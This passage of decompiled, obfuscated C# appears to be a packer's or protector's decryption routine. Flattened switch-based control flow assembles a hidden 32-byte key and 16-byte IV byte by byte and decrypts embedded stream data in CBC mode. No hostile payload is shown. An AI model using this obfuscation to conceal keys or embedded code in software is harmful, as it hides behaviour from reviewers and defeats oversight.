					case 320:
						num18 = 108 + 65;
						num2 = 13;
						continue;
					case 318:
						array2[9] = (byte)num18;
						num2 = 367;
						continue;
					case 133:
						num17 = 4 + 124;
						num2 = 399;
						continue;
					case 105:
						global::\u0004.\u0001.\u0004((object)stream);
						num2 = 323;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 370;
						}
						continue;
					case 96:
					case 178:
						if (num32 >= array6.Length)
						{
							num2 = 31;
							if (global::\u0004.\u0001.\u0004() == null)
							{
								num2 = 58;
							}
							continue;
						}
						goto case 186;
					case 222:
						num24++;
						num2 = 270;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 42:
						num17 = 67 + 57;
						num2 = 414;
						continue;
					case 382:
						array[24] = 156;
						num2 = 84;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 7:
						array[28] = (byte)num17;
						num2 = 74;
						continue;
					case 355:
						array2[13] = 193;
						num2 = 249;
						continue;
					case 111:
						array[20] = 95;
						num = 18;
						break;
					case 30:
						array[3] = 112;
						num2 = 6;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 3;
						}
						continue;
					case 196:
					case 277:
						num36 = global::\u0004.\u0001.\u0001((object)\u0088, \u0002);
						num2 = 165;
						continue;
					case 319:
						array[23] = 134;
						num2 = 192;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 170;
						}
						continue;
					case 380:
						array2[5] = (byte)num18;
						num2 = 405;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 52;
						}
						continue;
					case 374:
						array[18] = (byte)num17;
						num2 = 336;
						continue;
					case 70:
						\u0001(global::\u0004.\u0001.\u0002((object)obj), 0L);
						num2 = 104;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 300:
						array[22] = (byte)num17;
						num = 75;
						break;
					case 83:
						array[18] = 123;
						num2 = 32;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 23;
						}
						continue;
					case 8:
						array[9] = (byte)num17;
						num2 = 199;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 16;
						}
						continue;
					case 331:
						\u0001(symmetricAlgorithm, CipherMode.CBC);
						num2 = 168;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 247:
						num25 = 255u;
						num2 = 61;
						continue;
					case 295:
						array6[1] = array5[0];
						num2 = 407;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 167:
						num29 = array3.Length / 4;
						num2 = 174;
						continue;
					case 195:
						array7[num23 + num26] = (byte)((num35 & num25) >> num34);
						num2 = 109;
						continue;
					case 158:
						array[17] = (byte)num17;
						num2 = 85;
						continue;
					case 326:
						array2[15] = (byte)num18;
						num2 = 59;
						continue;
					case 284:
						num19 = 0;
						num2 = 240;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 285;
						}
						continue;
					case 286:
						array[26] = (byte)num17;
						num2 = 136;
						continue;
					case 155:
						num20 = (uint)((array4[num22 + 3] << 24) | (array4[num22 + 2] << 16) | (array4[num22 + 1] << 8) | array4[num22]);
						num2 = 423;
						continue;
					case 416:
						num17 = 78 + 25;
						num2 = 92;
						continue;
					case 236:
						num18 = 143 - 47;
						num2 = 232;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 49;
						}
						continue;
					case 58:
						if (\u0002 == -1)
						{
							num2 = 51;
							if (global::\u0004.\u0001.\u0004() == null)
							{
								continue;
							}
							break;
						}
						goto case 334;
					case 289:
						array2[15] = (byte)num18;
						num2 = 118;
						continue;
					case 363:
						\u0088 = (byte[])\u0005(stream);
						num2 = 105;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 323:
						num17 = 182 - 60;
						num2 = 16;
						continue;
					case 18:
						array[20] = 106;
						num2 = 42;
						continue;
					case 337:
						num30 = 0u;
						num2 = 78;
						continue;
					case 170:
						num17 = 81 + 28;
						num2 = 156;
						continue;
					case 291:
						array2[3] = (byte)num18;
						num2 = 421;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 400:
						array[10] = 124;
						num2 = 162;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 304:
						array2[1] = 208;
						num2 = 233;
						continue;
					case 169:
						num18 = 215 - 71;
						num2 = 153;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 97;
						}
						continue;
					case 290:
						array[23] = (byte)num17;
						num2 = 279;
						continue;
					case 87:
						array[7] = (byte)num17;
						num2 = 31;
						continue;
					case 242:
					case 281:
						num32 = 0;
						num2 = 96;
						continue;
					case 90:
						array2[10] = (byte)num18;
						num2 = 298;
						continue;
					case 375:
						array2[3] = (byte)num18;
						num2 = 22;
						continue;
					case 357:
						array[5] = (byte)num17;
						num2 = 359;
						continue;
					case 185:
						array2[7] = (byte)num18;
						num2 = 392;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 186;
						}
						continue;
					case 82:
						num18 = 57 + 45;
						num2 = 208;
						continue;
					case 332:
						num17 = 88 + 107;
						num2 = 260;
						continue;
					case 202:
						array[18] = 21;
						num2 = 83;
						continue;
					case 399:
						array[31] = (byte)num17;
						num2 = 193;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 316:
						num18 = 26 + 99;
						num2 = 318;
						continue;
					case 130:
						num17 = 176 - 58;
						num2 = 19;
						continue;
					case 240:
						array2[15] = (byte)num18;
						num2 = 101;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 208:
						array2[2] = (byte)num18;
						num2 = 369;
						continue;
					case 234:
						array[19] = 167;
						num2 = 420;
						continue;
					case 210:
						array7[num23] = (byte)(num31 & 0xFF);
						num2 = 228;
						continue;
					case 250:
						num17 = 182 - 87;
						num2 = 294;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 6;
						}
						continue;
					case 279:
						array[23] = 91;
						num2 = 138;
						continue;
					case 47:
						num18 = 128 + 108;
						num2 = 90;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 19:
						array[9] = (byte)num17;
						num2 = 211;
						continue;
					case 293:
						num18 = 103 + 42;
						num2 = 69;
						continue;
					case 203:
						array[25] = (byte)num17;
						num2 = 152;
						continue;
					case 307:
						array2[9] = (byte)num18;
						num = 28;
						break;
					case 86:
						if (array5 == null)
						{
							num2 = 242;
							continue;
						}
						goto case 351;
					case 417:
						num17 = 51 - 33;
						num2 = 411;
						continue;
					case 95:
						array6[7] = array5[3];
						num2 = 388;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 205:
						array2[8] = (byte)num18;
						num2 = 194;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 301:
						array[22] = (byte)num17;
						num2 = 173;
						continue;
					case 360:
						array2[1] = (byte)num18;
						num2 = 304;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 296;
						}
						continue;
					case 426:
						array[17] = (byte)num17;
						num = 306;
						break;
					case 424:
						array[13] = 20;
						num2 = 111;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 322;
						}
						continue;
					case 113:
						num18 = 167 - 55;
						num2 = 291;
						continue;
					case 84:
						array[24] = 146;
						num2 = 332;
						continue;
					case 61:
						num34 = 0;
						num2 = 207;
						continue;
					case 37:
						array4 = \u0088;
						num2 = 334;
						continue;
					case 20:
						num18 = 119 + 73;
						num2 = 305;
						continue;
					case 145:
						array2[12] = (byte)num18;
						num2 = 280;
						continue;
					case 175:
						array[1] = 163;
						num2 = 422;
						continue;
					case 173:
						num17 = 237 - 79;
						num2 = 115;
						continue;
					case 347:
						array[15] = (byte)num17;
						num2 = 161;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 179:
						array[5] = (byte)num17;
						num2 = 26;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 385:
						array2[2] = 167;
						num2 = 344;
						continue;
					case 55:
						num17 = 38 + 21;
						num2 = 361;
						continue;
					case 44:
						array[14] = (byte)num17;
						num2 = 39;
						continue;
					case 282:
						array[30] = (byte)num17;
						num = 412;
						break;
					case 264:
						num17 = 203 - 67;
						num2 = 352;
						continue;
					case 50:
						num33 = 0;
						num2 = 312;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 152:
						array[25] = 86;
						num2 = 213;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 15:
						num18 = 190 - 97;
						num2 = 296;
						continue;
					case 276:
						array2[9] = 150;
						num2 = 316;
						continue;
					case 41:
						num17 = 160 - 53;
						num2 = 150;
						continue;
					case 17:
						return \u0097(453);
					case 278:
						if (\u0088.Length != 0)
						{
							num2 = 277;
							continue;
						}
						goto case 14;
					case 63:
						if (num27 > 0)
						{
							num2 = 395;
							continue;
						}
						goto case 251;
					case 315:
						num17 = 246 - 82;
						num2 = 120;
						continue;
					case 85:
						num17 = 250 - 83;
						num2 = 367;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 374;
						}
						continue;
					case 115:
						array[22] = (byte)num17;
						num = 269;
						break;
					case 229:
						array2[12] = 124;
						num2 = 320;
						continue;
					case 397:
						num18 = 174 - 58;
						num2 = 68;
						continue;
					case 297:
						array2[6] = (byte)num18;
						num2 = 102;
						continue;
					case 261:
						num17 = 104 + 60;
						num2 = 272;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 198:
						num17 = 7 + 88;
						num = 348;
						break;
					case 98:
						array[7] = 133;
						num2 = 394;
						continue;
					case 410:
						array[4] = (byte)num17;
						num2 = 45;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 3;
						}
						continue;
					case 372:
						num34 += 8;
						num2 = 195;
						continue;
					case 230:
						num18 = 157 - 52;
						num2 = 380;
						continue;
					case 206:
						array[0] = 160;
						num2 = 162;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 175;
						}
						continue;
					case 249:
						array2[13] = 129;
						num2 = 9;
						continue;
					case 201:
						array[27] = 153;
						num2 = 391;
						continue;
					case 62:
						array[7] = (byte)num17;
						num2 = 98;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 224:
						array[23] = (byte)num17;
						num2 = 319;
						continue;
					case 228:
						array7[num23 + 1] = (byte)((num31 & 0xFF00) >> 8);
						num2 = 309;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 408;
						}
						continue;
					case 200:
						array2[14] = 74;
						num = 302;
						break;
					case 140:
						num17 = 76 + 77;
						num2 = 197;
						continue;
					case 266:
						global::\u0004.\u0001.\u0001((object)obj);
						num2 = 112;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 163:
						array[6] = (byte)num17;
						num2 = 339;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 398:
						array[13] = (byte)num17;
						num2 = 49;
						continue;
					case 23:
						num17 = 58 + 52;
						num2 = 311;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 341:
						num17 = 170 - 56;
						num2 = 310;
						continue;
					case 389:
						num17 = 245 - 81;
						num2 = 203;
						continue;
					case 336:
						array[18] = 112;
						num2 = 241;
						continue;
					case 268:
					case 423:
						num4 = num30;
						num2 = 337;
						continue;
					case 306:
						num17 = 142 - 93;
						num2 = 158;
						continue;
					case 265:
						array2[11] = (byte)num18;
						num2 = 169;
						continue;
					case 46:
						array2[14] = (byte)num18;
						num2 = 216;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 272:
						array[6] = (byte)num17;
						num2 = 137;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 87;
						}
						continue;
					case 214:
						array[10] = (byte)num17;
						num2 = 139;
						continue;
					case 420:
						array[19] = 55;
						num2 = 356;
						continue;
					case 219:
						array6[15] = array5[7];
						num2 = 281;
						continue;
					case 231:
						array[3] = 128;
						num2 = 159;
						continue;
					case 34:
						array[25] = (byte)num17;
						num = 198;
						break;
					case 51:
						symmetricAlgorithm = (SymmetricAlgorithm)global::\u0004.\u0001.\u0001();
						num2 = 331;
						continue;
					case 302:
						array2[15] = 110;
						num2 = 288;
						continue;
					case 69:
						array2[13] = (byte)num18;
						num2 = 355;
						continue;
					case 121:
						array[5] = 105;
						num = 215;
						break;
					case 368:
						array2[6] = (byte)num18;
						num2 = 418;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 263;
						}
						continue;
					case 373:
						num17 = 55 + 26;
						num2 = 7;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 330:
						array[3] = 121;
						num2 = 6;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 30;
						}
						continue;
					case 89:
						array[17] = 98;
						num2 = 226;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 409;
						}
						continue;
					case 172:
						array2[14] = (byte)num18;
						num2 = 1;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 1;
						}
						continue;
					case 66:
					case 312:
						if (num33 >= num27)
						{
							num2 = 136;
							if (global::\u0004.\u0001.\u0002())
							{
								num2 = 268;
							}
							continue;
						}
						goto case 4;
					case 109:
						num26++;
						num2 = 128;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 292:
						num17 = 186 - 62;
						num2 = 97;
						continue;
					case 408:
						array7[num23 + 2] = (byte)((num31 & 0xFF0000) >> 16);
						num2 = 402;
						continue;
					case 3:
						num17 = 74 + 70;
						num2 = 347;
						continue;
					case 171:
						num17 = 91 - 68;
						num2 = 34;
						continue;
					case 339:
						num17 = 186 - 62;
						num = 110;
						break;
					case 365:
						num17 = 188 - 62;
						num2 = 191;
						continue;
					case 68:
						array2[8] = (byte)num18;
						num2 = 214;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 220;
						}
						continue;
					case 283:
						array[19] = (byte)num17;
						num2 = 111;
						continue;
					case 81:
						cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
						num2 = 346;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 396:
						array2[7] = (byte)num18;
						num2 = 397;
						continue;
					case 246:
						array[16] = (byte)num17;
						num2 = 417;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 25:
						num17 = 65 + 64;
						num2 = 135;
						continue;
					case 45:
						num17 = 70 + 120;
						num2 = 379;
						continue;
					case 22:
						num18 = 119 + 100;
						num2 = 376;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 73:
						\u0088 = array7;
						num2 = 196;
						continue;
					case 26:
						array[5] = 53;
						num2 = 261;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 255:
						array2[4] = 131;
						num2 = 12;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 254:
						array[29] = 98;
						num2 = 349;
						continue;
					case 107:
						array[8] = 148;
						num2 = 177;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 108:
						array2[2] = 168;
						num2 = 385;
						continue;
					case 298:
						array2[11] = 241;
						num2 = 0;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 0;
						}
						continue;
					case 160:
						array[12] = (byte)num17;
						num2 = 292;
						continue;
					case 79:
						num18 = 186 - 62;
						num2 = 297;
						continue;
					case 49:
						num17 = 15 + 103;
						num2 = 347;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 404;
						}
						continue;
					case 321:
						num18 = 58 + 79;
						num2 = 185;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 191:
						array[29] = (byte)num17;
						num2 = 254;
						continue;
					case 362:
						array[30] = 92;
						num2 = 358;
						continue;
					case 335:
						array[29] = 164;
						num2 = 362;
						continue;
					case 102:
						num18 = 191 + 29;
						num2 = 368;
						continue;
					case 129:
						array[27] = (byte)num17;
						num2 = 83;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 201;
						}
						continue;
					case 376:
						array2[4] = (byte)num18;
						num2 = 24;
						continue;
					case 31:
						array[7] = 243;
						num2 = 364;
						continue;
					case 402:
						array7[num23 + 3] = (byte)((num31 & 0xFF000000u) >> 24);
						num2 = 132;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 71:
						array6[5] = array5[2];
						num = 95;
						break;
					case 144:
						num17 = 87 + 19;
						num2 = 67;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 142;
						}
						continue;
					case 159:
						array[3] = 42;
						num2 = 323;
						continue;
					case 233:
						array2[2] = 192;
						num2 = 82;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 275:
						num20 = 0u;
						num2 = 314;
						continue;
					case 299:
						global::\u0004.\u0001.\u0002((object)array6);
						num2 = 223;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 13:
						array2[12] = (byte)num18;
						num2 = 217;
						continue;
					case 139:
						num17 = 205 - 68;
						num2 = 371;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 409:
						array[17] = 115;
						num2 = 170;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 334:
						num27 = array4.Length % 4;
						num2 = 287;
						continue;
					case 137:
						array[6] = 162;
						num2 = 99;
						continue;
					case 342:
						array2[8] = (byte)num18;
						num2 = 15;
						continue;
					case 153:
						array2[11] = (byte)num18;
						num2 = 20;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 20;
						}
						continue;
					case 425:
						num18 = 21 + 104;
						num2 = 183;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 245:
						num18 = 99 - 58;
						num2 = 375;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 419:
						array[27] = (byte)num17;
						num2 = 378;
						continue;
					case 329:
						if (num27 > 0)
						{
							num2 = 275;
							continue;
						}
						goto case 147;
					case 220:
						num18 = 134 - 44;
						num = 205;
						break;
					case 405:
						num18 = 84 + 0;
						num2 = 258;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 215:
						num17 = 212 - 70;
						num2 = 179;
						continue;
					case 259:
						num26 = 0;
						num2 = 274;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 80:
						array2[1] = (byte)num18;
						num2 = 21;
						continue;
					case 64:
						array[22] = (byte)num17;
						num2 = 237;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 345:
						array2[12] = 242;
						num2 = 293;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 153;
						}
						continue;
					case 187:
						num22 = (uint)(num28 * 4);
						num = 227;
						break;
					case 381:
						array[8] = (byte)num17;
						num2 = 11;
						continue;
					case 356:
						num17 = 168 - 69;
						num2 = 38;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 283;
						}
						continue;
					case 168:
						transform = (ICryptoTransform)\u0001(symmetricAlgorithm, array3, array6);
						num2 = 106;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 53;
						}
						continue;
					case 267:
						array2[3] = (byte)num18;
						num2 = 52;
						continue;
					case 325:
						array[8] = (byte)num17;
						num2 = 60;
						continue;
					case 309:
						num17 = 31 + 122;
						num2 = 129;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 346:
						global::\u0004.\u0001.\u0001((object)cryptoStream, (object)array4, 0, array4.Length);
						num2 = 338;
						continue;
					case 294:
						array[11] = (byte)num17;
						num2 = 126;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 238:
						array[14] = 102;
						num2 = 77;
						continue;
					case 77:
						num17 = 183 - 102;
						num = 44;
						break;
					case 392:
						array2[7] = 37;
						num2 = 29;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 48:
						array2[4] = 109;
						num2 = 255;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 36:
						array[26] = 83;
						num = 386;
						break;
					case 117:
						array[2] = 60;
						num = 27;
						break;
					case 364:
						num17 = 4 + 89;
						num2 = 390;
						continue;
					case 118:
						array6 = array2;
						num2 = 299;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 204:
						array2[6] = 139;
						num2 = 324;
						continue;
					case 174:
						num30 = 0u;
						num2 = 308;
						continue;
					case 76:
						if (num26 > 0)
						{
							num2 = 29;
							if (global::\u0004.\u0001.\u0002())
							{
								num2 = 134;
							}
							continue;
						}
						goto case 195;
					case 72:
						array2[4] = 134;
						num2 = 48;
						continue;
					case 387:
						num20 |= array4[^(1 + num33)];
						num2 = 184;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 181:
						array[10] = 130;
						num2 = 264;
						continue;
					case 60:
						num17 = 47 + 123;
						num2 = 353;
						continue;
					case 92:
						array[29] = (byte)num17;
						num = 125;
						break;
					case 35:
						array[21] = (byte)num17;
						num2 = 262;
						continue;
					case 361:
						array[15] = (byte)num17;
						num2 = 2;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 3;
						}
						continue;
					case 378:
						num17 = 12 + 94;
						num2 = 119;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 192:
						num17 = 24 + 40;
						num2 = 290;
						continue;
					case 57:
						num17 = 119 + 100;
						num2 = 410;
						continue;
					case 52:
						array2[3] = 112;
						num2 = 245;
						continue;
					case 386:
						num17 = 85 + 122;
						num2 = 275;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 286;
						}
						continue;
					case 122:
						num18 = 32 - 11;
						num2 = 269;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 307;
						}
						continue;
					case 343:
						num17 = 96 + 63;
						num2 = 224;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 6:
						array[3] = 168;
						num2 = 226;
						continue;
					case 101:
						num18 = 181 + 29;
						num2 = 289;
						continue;
					case 232:
						array2[0] = (byte)num18;
						num2 = 93;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 403:
						num17 = 117 + 110;
						num2 = 62;
						continue;
					case 313:
						array6[13] = array5[6];
						num2 = 219;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 166:
						array2[0] = 114;
						num2 = 236;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 9:
						num18 = 44 + 1;
						num2 = 46;
						continue;
					case 270:
						num22 = 0u;
						num2 = 284;
						continue;
					case 418:
						array2[7] = 191;
						num = 190;
						break;
					case 401:
						array[9] = 124;
						num = 130;
						break;
					case 393:
						num17 = 36 + 36;
						num2 = 357;
						continue;
					case 225:
						num28 = num19 % num29;
						num2 = 273;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 182:
						num18 = 75 + 113;
						num2 = 340;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 10:
						array[28] = 191;
						num = 373;
						break;
					case 136:
						array[26] = 112;
						num2 = 144;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 309;
						}
						continue;
					case 354:
						array[31] = 130;
						num2 = 140;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 25;
						}
						continue;
					case 12:
						num18 = 48 - 27;
						num2 = 317;
						continue;
					case 65:
						if (num27 > 0)
						{
							num2 = 222;
							continue;
						}
						goto case 270;
					case 151:
						array[4] = (byte)num17;
						num2 = 393;
						continue;
					case 138:
						num17 = 204 - 68;
						num2 = 72;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 235;
						}
						continue;
					case 99:
						array[6] = 117;
						num2 = 221;
						continue;
					case 338:
						global::\u0004.\u0001.\u0003((object)cryptoStream);
						num2 = 232;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 363;
						}
						continue;
					case 43:
						array[12] = 152;
						num2 = 25;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 176:
						num17 = 94 + 73;
						num2 = 151;
						continue;
					case 104:
						array4 = (byte[])global::\u0004.\u0001.\u0001((object)obj, (int)global::\u0004.\u0001.\u0001(global::\u0004.\u0001.\u0002((object)obj)));
						num2 = 266;
						continue;
					case 157:
						num18 = 80 - 18;
						num2 = 396;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 149:
						if (num19 == num24 - 1)
						{
							num2 = 63;
							continue;
						}
						goto case 251;
					case 197:
						array[31] = (byte)num17;
						num2 = 244;
						continue;
					case 40:
						num22 = (uint)num23;
						num2 = 155;
						continue;
					case 177:
						num17 = 22 + 97;
						num2 = 381;
						continue;
					case 74:
						array[28] = 96;
						num2 = 141;
						continue;
					case 38:
						array[2] = 133;
						num2 = 117;
						continue;
					case 239:
					case 285:
						if (num19 >= num24)
						{
							num = 73;
							break;
						}
						goto case 225;
					case 54:
						num17 = 90 + 87;
						num2 = 35;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 20;
						}
						continue;
					case 248:
						array2 = new byte[16];
						num2 = 166;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 258:
						array2[5] = (byte)num18;
						num = 425;
						break;
					case 127:
						array2[6] = (byte)num18;
						num = 383;
						break;
					case 124:
						num18 = 9 + 114;
						num2 = 80;
						continue;
					case 128:
					case 274:
						if (num26 >= num27)
						{
							num = 67;
							break;
						}
						goto case 76;
					case 194:
						num18 = 123 + 74;
						num2 = 342;
						continue;
					case 161:
						array[16] = 129;
						num2 = 78;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 148;
						}
						continue;
					case 394:
						num17 = 208 - 69;
						num2 = 87;
						continue;
					case 59:
						num18 = 65 + 20;
						num2 = 240;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 391:
						array[27] = 157;
						num2 = 315;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 39:
						array[15] = 105;
						num2 = 55;
						continue;
					case 370:
						global::\u0004.\u0001.\u0004((object)cryptoStream);
						num = 37;
						break;
					case 322:
						array[14] = 164;
						num2 = 40;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 41;
						}
						continue;
					case 421:
						num18 = 209 - 69;
						num = 267;
						break;
					case 97:
						array[12] = (byte)num17;
						num2 = 43;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 263:
						num20 = 0u;
						num2 = 65;
						continue;
					case 310:
						array[14] = (byte)num17;
						num2 = 238;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 241:
						array[18] = 155;
						num2 = 202;
						continue;
					case 93:
						array2[0] = 84;
						num2 = 124;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 134:
						num25 <<= 8;
						num2 = 320;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 372;
						}
						continue;
					case 288:
						num18 = 34 + 70;
						num2 = 326;
						continue;
					case 324:
						num18 = 180 - 60;
						num2 = 127;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 35;
						}
						continue;
					case 384:
						array[29] = (byte)num17;
						num2 = 416;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 213:
						array[25] = 88;
						num2 = 171;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					default:
						num18 = 127 - 42;
						num2 = 91;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 262:
						array[21] = 134;
						num2 = 271;
						continue;
					case 120:
						array[27] = (byte)num17;
						num2 = 209;
						continue;
					case 411:
						array[16] = (byte)num17;
						num2 = 89;
						continue;
					case 379:
						array[4] = (byte)num17;
						num2 = 176;
						continue;
					case 296:
						array2[8] = (byte)num18;
						num2 = 276;
						continue;
					case 190:
						array2[7] = 110;
						num2 = 321;
						continue;
					case 328:
						array[22] = (byte)num17;
						num2 = 212;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 243:
						array[0] = 146;
						num2 = 123;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 120;
						}
						continue;
					case 226:
						array[4] = 92;
						num2 = 189;
						continue;
					case 404:
						array[13] = (byte)num17;
						num2 = 424;
						continue;
					case 252:
						num18 = 70 + 31;
						num2 = 265;
						continue;
					case 143:
						array[21] = (byte)num17;
						num2 = 188;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 256:
						array[1] = (byte)num17;
						num2 = 38;
						continue;
					case 287:
						num24 = array4.Length / 4;
						num2 = 146;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 29:
						num18 = 193 - 64;
						num2 = 253;
						continue;
					case 5:
						array2[3] = (byte)num18;
						num2 = 113;
						continue;
					case 112:
						array = new byte[32];
						num2 = 243;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 171;
						}
						continue;
					case 123:
						num17 = 214 - 71;
						num2 = 327;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 158;
						}
						continue;
					case 377:
						array2[12] = (byte)num18;
						num = 345;
						break;
					case 244:
						num17 = 203 - 67;
						num2 = 56;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
